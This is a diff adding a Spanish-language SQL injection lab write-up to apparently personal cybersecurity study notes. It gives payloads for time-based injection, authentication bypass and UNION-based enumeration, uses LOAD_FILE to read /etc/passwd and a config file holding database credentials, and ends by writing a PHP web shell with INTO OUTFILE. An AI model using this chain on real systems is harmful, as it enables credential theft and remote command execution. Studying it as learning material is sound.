@@ -953,7 +953,154 @@ Por otra parte, existen otras medidas como WAFs (Cloudflare o Modsecurity) que b
 
 También podremos usar queries parametrizadas, ya sea en PHP Vanilla, o Laravel/Symfony podremos usar preparadores de queries o query builders en inglés.
 
+## Final Assesment
 
+`admin' AND (SELECT 1 FROM (SELECT(SLEEP(5))) AS temp) AND '1'='1`
+
+### **`AND (SELECT 1 FROM (SELECT(SLEEP(5))) AS temp)`**
+
+Aquí comienza la parte clave de la inyección. Esta es una inyección de **tiempo**, diseñada para hacer que el servidor retrase su respuesta si la inyección es exitosa, permitiéndonos confirmar que hemos sido capaces de modificar la consulta de manera efectiva.
+
+- **`AND`**: Es un operador lógico que se utiliza para añadir una condición adicional a la consulta SQL original. La consulta completa ahora necesita cumplir con ambas condiciones:
+    
+    1. El `username = 'admin'` original.
+    2. La nueva condición que estamos inyectando: **la ejecución del `SLEEP(5)`**.
+    
+    La consulta original podría verse algo así después de la inyección:
+    
+    `SELECT * FROM users WHERE username = 'admin' AND password = 'password' AND (SELECT 1 FROM (SELECT(SLEEP(5))) AS temp);`
+    
+    Como ves, estamos añadiendo una condición extra que no afecta el resto de la consulta, pero ejecuta un retraso si es válida.
+    
+- **`SELECT 1 FROM ... AS temp`**: Aquí estamos utilizando una subconsulta que devuelve un **1** para que la condición sea verdadera. La subconsulta es:
+    
+    `SELECT 1 FROM (SELECT(SLEEP(5))) AS temp`
+    
+    - **`SELECT 1`**: Esta parte simplemente retorna el valor 1. Esto se hace para cumplir con la lógica de la consulta original, que podría estar esperando que la subconsulta devuelva un valor (en lugar de hacer algo como `SELECT *`, simplemente seleccionamos un valor constante que no afecta el resultado, como 1).
+    - **`FROM (SELECT(SLEEP(5))) AS temp`**: Aquí, estamos utilizando otra subconsulta que ejecuta **`SLEEP(5)`**. El `SLEEP(5)` hace que la consulta se demore 5 segundos antes de responder. Este retraso es el principal indicador de que hemos logrado realizar la inyección SQL correctamente.
+        - **`SLEEP(5)`**: Esta función pausa la ejecución del servidor por el número de segundos indicado (en este caso, 5 segundos).
+        - **`AS temp`**: Le estamos dando un alias a la subconsulta `(SELECT(SLEEP(5)))`, lo cual es necesario porque, en SQL, cuando se usa una subconsulta en el `FROM`, debes darle un nombre (alias). En este caso, hemos utilizado el alias **`temp`**.
+
+Entonces, la subconsulta completa **`(SELECT 1 FROM (SELECT(SLEEP(5))) AS temp)`** asegura que la consulta se retrasará 5 segundos si se ejecuta correctamente.
+
+
+Ahora como sabemos que en el medio de la query espera un valor, podremos hacer el siguiente payload para acceder al panel de administración:
+
+admin' OR (SELECT 1) OR '1'='1
+
+Al usar un apóstrofe simple vemos como rompe:
+
+![[Captura de pantalla 2024-11-28 a las 20.29.04.png]]
+
+Lo que me viene a la cabeza primero sería un UNION o un ORDER BY.
+
+```sql 
+-- INCREMENTANDO DE 1 en 1 hasta que rompe
+' ORDER BY 6-- -
+```
+
+Probando con el ORDER BY vemos que funciona hasta la columna 6, que nos pone que no se encuentra:
+
+![[Captura de pantalla 2024-11-28 a las 20.49.20.png]]
+
+Ahora que sabemos que son 5 columnas como máximo, podremos hacer payloads con el UNION select y junk data:
+
+```sql
+' UNION SELECT 1,2,@@version,4,5 -- -
+```
+
+```sql
+' UNION SELECT 1,2,user(),4,5 -- -
+```
+
+Como podemos ver nos devuelve que somos el usuario root.
+
+![[Captura de pantalla 2024-11-28 a las 20.53.01.png]]
+
+Vamos a enumerar los permisos de este usuario:
+
+```sql
+' UNION SELECT 1,2,super_priv,4,5 FROM mysql.user -- -
+```
+
+![[Captura de pantalla 2024-11-28 a las 20.56.16.png]]
+
+Como podemos ver, nos devuelve un Y que quiere decir que tenemos super privilegios.
+
+Vamos a verificar ahora que la variable secure_file_priv esté vacía para poder leer/escribir ficheros por todo el sistema.
+
+```sql
+' UNION SELECT 1, 2, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
+```
+
+Como vemos nos la devuelve vacía, lo que quiere decir que si.
+
+![[Captura de pantalla 2024-11-28 a las 20.58.40.png]]
+
+Con la payload que veremos a continuación podremos listar los permisos del usuario de manera individual, lo que nos permitirá ver si tenemos el permiso FILE:
+
+```sql 
+' UNION SELECT 1, 2, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
+```
+
+
+![[Captura de pantalla 2024-11-28 a las 21.01.49.png]]
+
+Ahora que sabemos que tenemos el permiso FILE, y que la variable de secure_file_priv está vacía, solo nos falta saber si tenemos permisos en la carpeta del servidor para escribir, por lo tanto solo lo sabremos escribiendo algo.
+
+![[Captura de pantalla 2024-11-28 a las 21.05.03.png]]
+
+Vamos a ver si podemos leer ficheros con LOAD_FILE con esta payload:
+
+```sql
+' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4, 5-- -
+```
+
+![[Captura de pantalla 2024-11-28 a las 21.06.24.png]]
+
+Y efectivamente podemos.
+
+Sabemos que el servidor es un Apache, vamos a ver si podemos descubrir un directorio en el que podamos escribir.
+
+Vamos a leer el fichero de configuración de apache, a ver que nos muestra.
+
+```sql
+' UNION SELECT 1, LOAD_FILE("/etc/apache2/apache2.conf"), 3, 4, 5-- -
+```
+
+He recordado que haciendo enumeración, encontré un fichero config.php, por lo tanto podría leerlo con la siguiente payload:
+
+```sql
+' UNION SELECT 1, LOAD_FILE("/var/www/html/config.php"), 3, 4, 5-- -
+```
+
+Lo que nos dará los datos de acceso a la base de datos:
+
+![Captura de pantalla 2024-11-28 a las 21.18.05.png](app://58a35861d6f1b4879a0893648a0c982392f4/Users/sergio/Library/CloudStorage/GoogleDrive-sergioromagr@gmail.com/Mi%20unidad/Ciberseguridad/cybersec/cybersec-notes/Files/Captura%20de%20pantalla%202024-11-28%20a%20las%2021.18.05.png?1732825094985)
+
+Como hemos visto anteriormente estamos en la url /dashboard, por lo tanto vamos a probar si podemos escribir en este directorio, ya que en la raíz no tenemos permisos.
+
+```sql
+' union select 1,'file written successfully!',3,4,5 into outfile '/var/www/html/proof.txt'-- -
+```
+
+Como vemos se ha subido correctamente.
+
+![[Captura de pantalla 2024-11-28 a las 22.12.58.png]]
+
+Y a partir de aquí tendremos que hacer nuestra webshell en php, subirla y ya estaría!
+
+```sql
+' UNION SELECT 1,'<?php system($_REQUEST[0]);?>',3,4, 5 into outfile '/var/www/html/dashboard/shell.php' -- -
+```
+
+Como vemos ya está funcionando la shell:
+
+![[Captura de pantalla 2024-11-28 a las 22.15.43.png]]
+
+Si seguimos navegando, hacia atrás con comandos como ls ../../.., conseguiremos ver los ficheros que aparecen, y cuando veamos el que necesitamos, podremos hacer un cat teniendo la ruta.
+
+![[Captura de pantalla 2024-11-28 a las 22.19.20.png]]
 
 ---
 
